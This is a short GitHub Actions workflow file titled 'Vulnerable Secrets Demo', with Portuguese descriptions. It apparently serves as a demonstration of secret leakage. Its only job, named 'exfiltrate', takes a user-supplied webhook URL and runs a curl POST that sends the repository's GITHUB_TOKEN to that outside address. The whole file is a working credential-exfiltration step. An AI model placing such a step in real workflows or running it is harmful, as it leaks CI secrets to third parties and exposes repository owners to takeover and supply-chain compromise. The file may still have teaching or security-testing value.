# .github/workflows/vuln-secret-demo.yml
name: "Vulnerable Secrets Demo"

on:
  workflow_dispatch:
    inputs:
      url:
        description: "Webhook URL para exfiltração"
        required: true
        type: string

jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secret
        run: |
          curl -X POST -d "token=${{ secrets.GITHUB_TOKEN }}" "${{ github.event.inputs.url }}"
